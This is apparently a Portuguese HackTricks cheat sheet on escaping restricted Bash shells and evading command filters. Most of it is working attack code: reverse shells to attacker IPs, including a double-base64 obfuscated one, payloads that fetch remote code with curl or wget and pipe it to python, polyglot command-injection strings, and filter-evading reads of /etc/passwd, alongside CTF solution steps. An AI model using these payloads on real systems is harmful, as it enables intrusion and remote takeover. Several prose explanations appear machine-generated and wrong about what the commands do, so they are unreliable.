# Bypassando Restrições no Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bypass de Limitações Comuns

### Shell Reverso
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell reverso curto

Um shell reverso curto é uma técnica de hacking que permite a um invasor obter acesso a um sistema remoto e executar comandos nele. O invasor cria um shell reverso no sistema alvo, que se conecta de volta ao invasor, permitindo assim o controle remoto do sistema. Isso pode ser usado para explorar vulnerabilidades e obter acesso não autorizado a sistemas. É importante ressaltar que o uso de um shell reverso para fins maliciosos é ilegal e pode resultar em consequências legais graves.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Bypassar Caminhos e palavras proibidas

Existem várias técnicas que podem ser usadas para contornar restrições de caminhos e palavras proibidas no Bash. Aqui estão algumas delas:

1. **Usar caminhos absolutos**: Em vez de usar caminhos relativos, você pode usar caminhos absolutos para acessar arquivos ou executáveis ​​que estão restritos. Por exemplo, em vez de digitar `./arquivo_restrito`, você pode digitar `/caminho_completo/arquivo_restrito`.

2. **Usar caracteres de escape**: Se uma palavra está proibida, você pode usar caracteres de escape para contornar a restrição. Por exemplo, se a palavra proibida é `proibido`, você pode digitar `pro\ibido` para evitar a detecção.

3. **Renomear arquivos ou executáveis**: Se um arquivo ou executável está restrito, você pode renomeá-lo para evitar a detecção. Por exemplo, se o arquivo restrito é chamado de `restrito.sh`, você pode renomeá-lo para `permitido.sh` e executá-lo usando o novo nome.

4. **Usar aliases**: Você pode criar aliases para comandos ou executáveis ​​restritos. Por exemplo, se o comando `ls` está restrito, você pode criar um alias chamado `listar` que execute o mesmo comando.

5. **Usar variáveis ​​de ambiente**: Você pode usar variáveis ​​de ambiente para contornar restrições. Por exemplo, se um caminho está restrito, você pode definir uma variável de ambiente com o caminho desejado e usá-la em vez do caminho restrito.

Lembre-se de que essas técnicas devem ser usadas com responsabilidade e apenas para fins legais e autorizados. O uso indevido dessas técnicas pode resultar em consequências legais.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypassar espaços proibidos

Em algumas situações, você pode encontrar restrições que impedem o uso de espaços em comandos no Bash. No entanto, existem algumas técnicas que você pode usar para contornar essas restrições.

Uma maneira de contornar essa restrição é usar a barra invertida (\) para escapar o espaço. Por exemplo, em vez de digitar um espaço normalmente, você pode digitar "\ " para representar um espaço.

Outra técnica é usar aspas para envolver o comando que contém espaços. Por exemplo, em vez de digitar um comando como `ls -l /etc/passwd`, você pode digitar `'ls -l /etc/passwd'` ou `"ls -l /etc/passwd"`.

Além disso, você também pode usar a variável de ambiente `$IFS` para contornar as restrições de espaço. O `$IFS` é o separador de campo interno e, por padrão, inclui o espaço como um separador. No entanto, você pode alterar o valor do `$IFS` para um caractere que não seja um espaço, como um ponto-e-vírgula (;), para contornar as restrições de espaço.

Lembre-se de que essas técnicas podem não funcionar em todas as situações, pois dependem das configurações e restrições específicas do sistema. Portanto, é importante entender as limitações e testar cuidadosamente essas técnicas antes de usá-las em um ambiente de produção.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypassar barra invertida e barra

Às vezes, ao tentar executar comandos em um ambiente restrito do Bash, você pode encontrar restrições que impedem o uso de barras invertidas (\) e barras (/). No entanto, existem algumas técnicas que você pode usar para contornar essas restrições.

#### Usando caracteres hexadecimais

Uma maneira de contornar as restrições é usar caracteres hexadecimais para representar as barras invertidas e barras. Por exemplo, em vez de usar a barra invertida (\), você pode usar o código hexadecimal \x5c. Da mesma forma, em vez de usar a barra (/), você pode usar o código hexadecimal \x2f.

```
$ echo -e "ls\x20-l"
```

#### Usando o comando printf

Outra técnica é usar o comando printf para imprimir os caracteres desejados. Por exemplo, você pode usar o seguinte comando para imprimir uma barra invertida (\):

```
$ printf "%s" "\\"
```

Da mesma forma, você pode usar o seguinte comando para imprimir uma barra (/):

```
$ printf "%s" "/"
```

#### Usando o comando echo -e

O comando echo -e também pode ser usado para contornar as restrições. Por exemplo, você pode usar o seguinte comando para imprimir uma barra invertida (\):

```
$ echo -e "\\"
```

Da mesma forma, você pode usar o seguinte comando para imprimir uma barra (/):

```
$ echo -e "/"
```

Essas técnicas podem ser úteis ao tentar contornar restrições de barras invertidas e barras em um ambiente restrito do Bash. No entanto, é importante lembrar que o uso indevido dessas técnicas pode violar políticas de segurança e ser considerado uma atividade ilegal. Portanto, sempre use essas técnicas com responsabilidade e dentro dos limites legais.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Bypassar pipes

Pipes são uma forma comum de redirecionar a saída de um comando para a entrada de outro comando no Linux. No entanto, em certos casos, as restrições do shell podem impedir o uso de pipes. Felizmente, existem algumas maneiras de contornar essas restrições e usar pipes mesmo quando eles são bloqueados.

#### Usando process substitution

Uma maneira de contornar as restrições de pipes é usar a substituição de processos. A substituição de processos permite que você execute um comando e use sua saída como entrada para outro comando, sem usar um pipe.

A sintaxe para usar a substituição de processos é a seguinte:

```bash
command1 <(command2)
```

Por exemplo, se você quiser usar a saída do comando `ls` como entrada para o comando `grep`, você pode fazer o seguinte:

```bash
grep "pattern" <(ls)
```

#### Usando o comando `tee`

Outra maneira de contornar as restrições de pipes é usar o comando `tee`. O comando `tee` lê a entrada padrão e a grava tanto na saída padrão quanto em um arquivo.

A sintaxe para usar o comando `tee` é a seguinte:

```bash
command1 | tee file | command2
```

Por exemplo, se você quiser usar a saída do comando `ls` como entrada para o comando `grep`, você pode fazer o seguinte:

```bash
ls | tee /dev/tty | grep "pattern"
```

Neste exemplo, o comando `tee /dev/tty` grava a saída do comando `ls` tanto na saída padrão quanto no terminal, permitindo que você use a saída como entrada para o comando `grep`.

#### Usando redirecionamento de arquivo

Uma terceira maneira de contornar as restrições de pipes é usar o redirecionamento de arquivo. O redirecionamento de arquivo permite que você redirecione a saída de um comando para um arquivo e, em seguida, use esse arquivo como entrada para outro comando.

A sintaxe para usar o redirecionamento de arquivo é a seguinte:

```bash
command1 > file ; command2 < file
```

Por exemplo, se você quiser usar a saída do comando `ls` como entrada para o comando `grep`, você pode fazer o seguinte:

```bash
ls > file ; grep "pattern" < file
```

Neste exemplo, o comando `ls > file` redireciona a saída do comando `ls` para o arquivo `file`, e o comando `grep "pattern" < file` usa o conteúdo do arquivo `file` como entrada.

Essas são algumas maneiras de contornar as restrições de pipes e usar pipes mesmo quando eles são bloqueados. Experimente essas técnicas e veja qual funciona melhor para você.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypassar com codificação hexadecimal

Às vezes, certas restrições de segurança podem ser aplicadas a comandos Bash para evitar a execução de certas ações. No entanto, é possível contornar essas restrições usando codificação hexadecimal.

A codificação hexadecimal envolve a conversão de caracteres ASCII em sua representação hexadecimal correspondente. Isso permite que você insira caracteres especiais ou proibidos em um comando, contornando assim as restrições impostas.

Aqui está um exemplo de como usar a codificação hexadecimal para contornar restrições de Bash:

```
$ echo -e "\x63\x61\x74 /etc/passwd"
```

Neste exemplo, o comando `echo` é usado para imprimir o conteúdo do arquivo `/etc/passwd`. No entanto, a restrição de Bash impede a execução direta desse comando. Usando a codificação hexadecimal, podemos contornar essa restrição e executar o comando com sucesso.

Lembre-se de que a codificação hexadecimal pode ser usada para contornar restrições, mas também pode ser detectada por sistemas de segurança. Portanto, é importante usá-la com cautela e apenas para fins legítimos.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypassar IPs

Existem várias técnicas para contornar restrições de IP em um sistema Linux. Aqui estão algumas delas:

#### 1. Usar um proxy

Um proxy pode ser usado para mascarar o endereço IP real e permitir o acesso a recursos restritos. Existem vários tipos de proxies disponíveis, como proxies HTTP, SOCKS e VPNs.

#### 2. Usar uma rede privada virtual (VPN)

Uma VPN cria uma conexão segura e criptografada entre o dispositivo do usuário e a rede privada, permitindo que o tráfego da Internet seja roteado através de um servidor remoto. Isso pode ajudar a contornar restrições de IP, pois o tráfego parece originar-se do servidor remoto.

#### 3. Usar a técnica de tunelamento

O tunelamento envolve encapsular o tráfego em um protocolo diferente para contornar restrições de IP. Por exemplo, o SSH pode ser usado para criar um túnel seguro e rotear o tráfego através de um servidor intermediário.

#### 4. Usar uma conexão de Internet móvel

Se o acesso a um recurso restrito for bloqueado em uma rede Wi-Fi específica, uma conexão de Internet móvel pode ser usada para contornar essa restrição. Isso ocorre porque a conexão móvel usa uma rede diferente e, portanto, tem um endereço IP diferente.

#### 5. Usar um serviço de proxy reverso

Um serviço de proxy reverso pode ser usado para redirecionar o tráfego através de um servidor intermediário. Isso pode ajudar a contornar restrições de IP, pois o tráfego parece originar-se do servidor intermediário.

É importante lembrar que o contorno de restrições de IP pode ser ilegal ou violar os termos de serviço de um sistema. Portanto, é essencial agir de acordo com as leis e regulamentos aplicáveis e obter permissão adequada antes de realizar qualquer ação.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltração de dados baseada em tempo

A exfiltração de dados baseada em tempo é uma técnica utilizada para transferir dados de um sistema comprometido para um local externo, aproveitando atrasos de tempo. Essa técnica é útil quando outras formas de exfiltração de dados, como transferências de arquivos convencionais, são bloqueadas ou monitoradas.

#### Comandos úteis do Linux

Aqui estão alguns comandos úteis do Linux que podem ser usados para contornar restrições do Bash e facilitar a exfiltração de dados baseada em tempo:

1. `ping`: O comando `ping` pode ser usado para enviar pacotes ICMP para um host externo. Ao ajustar o intervalo de tempo entre os pacotes, é possível transmitir dados codificados no atraso entre os pacotes.

2. `nc`: O comando `nc` (netcat) é uma ferramenta de rede versátil que pode ser usada para criar conexões TCP ou UDP. É possível usar o `nc` para enviar dados para um servidor externo, aproveitando os atrasos de tempo entre as conexões.

3. `curl`: O comando `curl` é uma ferramenta de linha de comando para transferir dados usando vários protocolos, como HTTP, HTTPS, FTP, entre outros. É possível usar o `curl` para enviar dados para um servidor externo, aproveitando os atrasos de tempo entre as solicitações.

4. `wget`: O comando `wget` é uma ferramenta de linha de comando para baixar arquivos da web. Assim como o `curl`, é possível usar o `wget` para enviar dados para um servidor externo, aproveitando os atrasos de tempo entre as solicitações.

5. `ssh`: O comando `ssh` é usado para fazer login em um servidor remoto de forma segura. É possível usar o `ssh` para estabelecer uma conexão com um servidor externo e enviar dados através dessa conexão, aproveitando os atrasos de tempo entre os pacotes.

Esses comandos podem ser combinados com técnicas de codificação e compactação de dados para otimizar a exfiltração de dados baseada em tempo. No entanto, é importante lembrar que a exfiltração de dados é uma atividade ilegal e deve ser realizada apenas com permissão explícita e legal.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obtendo caracteres de Variáveis de Ambiente

Em certos cenários de hacking, pode ser útil obter caracteres específicos de variáveis de ambiente no sistema Linux. Isso pode ser feito usando o comando `echo` em conjunto com a sintaxe `${var:offset:length}`. 

Aqui está um exemplo de como obter caracteres de uma variável de ambiente chamada `SECRET`:

```bash
echo ${SECRET:0:1}  # Obtém o primeiro caractere da variável SECRET
echo ${SECRET:1:1}  # Obtém o segundo caractere da variável SECRET
```

Você pode ajustar o valor de `offset` para obter caracteres em diferentes posições da variável de ambiente. O valor de `length` define quantos caracteres serão retornados. 

Essa técnica pode ser útil em situações em que você precisa extrair informações sensíveis de variáveis de ambiente, como senhas ou chaves de API. No entanto, é importante lembrar que o acesso não autorizado a informações confidenciais é ilegal e deve ser realizado apenas com permissão adequada.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltração de dados DNS

Você pode usar **burpcollab** ou [**pingb**](http://pingb.in), por exemplo.

### Comandos internos

Caso você não consiga executar funções externas e tenha acesso apenas a um **conjunto limitado de comandos internos para obter RCE**, existem alguns truques úteis para fazer isso. Geralmente, você **não poderá usar todos** os **comandos internos**, então você deve **conhecer todas as suas opções** para tentar burlar a restrição. Ideia do [**devploit**](https://twitter.com/devploit).\
Primeiro, verifique todos os [**comandos internos do shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Em seguida, aqui estão algumas **recomendações**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Injeção de comando poliglota

Polyglot command injection is a technique used to bypass restrictions in Bash commands. It involves crafting a command that can be interpreted by multiple interpreters, such as Bash, Python, and Perl. By doing so, an attacker can exploit vulnerabilities in the system and execute arbitrary commands.

To perform a polyglot command injection, the attacker needs to carefully construct the command to ensure it is valid in multiple languages. This can be achieved by using syntax and characters that are common to different interpreters.

For example, consider the following command:

```bash
$(python -c 'print("Hello, world!")')
```

This command can be interpreted by both Bash and Python. In Bash, it will execute the command within the `$()` syntax, while in Python, it will execute the `print` statement.

By leveraging polyglot command injection, an attacker can bypass restrictions and execute malicious commands on the target system. It is important for system administrators to be aware of this technique and implement proper security measures to prevent such attacks.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypassar possíveis regexes

Às vezes, ao realizar testes de penetração, você pode encontrar restrições de entrada que usam expressões regulares (regexes) para validar os dados. No entanto, existem algumas técnicas que você pode usar para contornar essas restrições e enviar dados que normalmente seriam bloqueados.

Uma maneira de contornar regexes é usar caracteres especiais que podem enganar a expressão regular. Por exemplo, você pode usar o caractere de escape `\` para evitar que um caractere seja interpretado como especial pela regex. Além disso, você pode usar classes de caracteres como `[a-z]` para corresponder a qualquer caractere de `a` a `z`.

Outra técnica é usar sequências de escape octal ou hexadecimal para representar caracteres especiais. Por exemplo, o caractere de barra invertida `\` pode ser representado como `\x5c` ou `\0134`.

Além disso, você pode tentar usar metacaracteres para contornar regexes. Por exemplo, o metacaractere `.` corresponde a qualquer caractere, exceto uma nova linha. Portanto, se você quiser contornar uma regex que bloqueia certos caracteres, você pode usar `.` para corresponder a esses caracteres.

Lembre-se de que essas técnicas podem não funcionar em todas as situações, pois a eficácia depende da implementação específica da regex. Portanto, é importante testar cuidadosamente suas técnicas de contorno para garantir que elas funcionem corretamente.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

O Bashfuscator é uma ferramenta poderosa usada para ofuscar scripts Bash, tornando-os mais difíceis de serem detectados e analisados. Ele usa várias técnicas de ofuscação para modificar o código-fonte do script, tornando-o menos legível para os olhos humanos e mais desafiador para análise automatizada.

O Bashfuscator pode ser usado para contornar restrições impostas em ambientes restritos, onde a execução de scripts Bash é limitada ou monitorada. Ao ofuscar o script, é possível evitar a detecção de palavras-chave ou padrões específicos que poderiam acionar alertas de segurança.

Além disso, o Bashfuscator também pode ser usado para proteger a propriedade intelectual de scripts Bash, dificultando a engenharia reversa e a cópia não autorizada.

No entanto, é importante ressaltar que o Bashfuscator não é uma ferramenta de hacking em si. Seu objetivo principal é fornecer uma camada adicional de proteção e privacidade para scripts Bash legítimos. O uso indevido dessa ferramenta para fins maliciosos é estritamente proibido e pode resultar em consequências legais.

Para usar o Bashfuscator, basta fornecer o script Bash que deseja ofuscar como entrada e executar o comando apropriado. O Bashfuscator irá processar o script e gerar uma versão ofuscada que pode ser executada normalmente.

É importante lembrar que a ofuscação não é uma solução infalível e não deve ser considerada como a única medida de segurança. É sempre recomendável implementar outras práticas de segurança, como controle de acesso adequado, monitoramento de logs e atualizações regulares do sistema operacional e software.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE com 5 caracteres

Neste capítulo, vamos explorar uma técnica de execução remota de código (RCE) usando apenas 5 caracteres. Essa técnica é extremamente útil quando você está lidando com restrições de shell, como quando o acesso ao shell é limitado ou quando certos comandos são bloqueados.

A ideia por trás dessa técnica é usar um comando do shell que seja permitido e que possa ser usado para executar outros comandos. O comando que usaremos é o `echo`, que é amplamente suportado em diferentes sistemas operacionais.

Aqui está o comando que usaremos para executar comandos arbitrários:

```bash
echo "<comando>" | sh
```

Substitua `<comando>` pelo comando que você deseja executar. Por exemplo, se você quiser listar o conteúdo de um diretório, você pode usar o seguinte comando:

```bash
echo "ls" | sh
```

Isso executará o comando `ls` e exibirá o conteúdo do diretório atual.

Lembre-se de que essa técnica pode ser usada para executar qualquer comando permitido pelo shell em que você está trabalhando. No entanto, tenha cuidado ao executar comandos que possam causar danos ou comprometer a segurança do sistema.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE com 4 caracteres

Neste capítulo, vamos explorar uma técnica de execução remota de código (RCE) usando apenas 4 caracteres. Essa técnica é extremamente útil quando você está lidando com restrições de shell, como quando o acesso ao shell é limitado ou quando certos caracteres são bloqueados.

A ideia por trás dessa técnica é usar um comando do Linux que tenha apenas 4 caracteres para executar um código arbitrário. Aqui estão alguns comandos úteis que podem ser usados:

1. `echo`: O comando `echo` é usado para imprimir uma linha de texto na saída padrão. No entanto, também pode ser usado para executar comandos. Por exemplo, você pode usar o comando `echo` para executar um comando como `ls` da seguinte maneira: `echo ls`.

2. `eval`: O comando `eval` é usado para avaliar uma string como um comando. Isso significa que você pode usar o comando `eval` para executar qualquer comando que desejar. Por exemplo, você pode usar o comando `eval` para executar o comando `ls` da seguinte maneira: `eval ls`.

3. `$_`: A variável especial `$_` contém o último argumento do comando anterior. Isso significa que você pode usar a variável `$_` para executar o último comando novamente. Por exemplo, se você executar o comando `ls`, poderá executá-lo novamente usando `$_`.

4. `!!`: O comando `!!` é usado para executar o último comando novamente. Isso pode ser útil quando você deseja repetir o último comando executado. Por exemplo, se você executar o comando `ls`, poderá executá-lo novamente usando `!!`.

Esses comandos podem ser usados para executar código arbitrário em um ambiente restrito. No entanto, é importante lembrar que o uso indevido dessas técnicas pode ser ilegal e antiético. Sempre obtenha permissão adequada antes de realizar qualquer teste de penetração ou hacking.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypassando Restrições do Bash

Se você estiver dentro de um sistema de arquivos com as proteções de **somente leitura e noexec** ou até mesmo em um contêiner distroless, ainda existem maneiras de **executar binários arbitrários, até mesmo um shell!**:

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Bypass de Chroot e Outras Jails

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Referências e Mais

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Use o [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
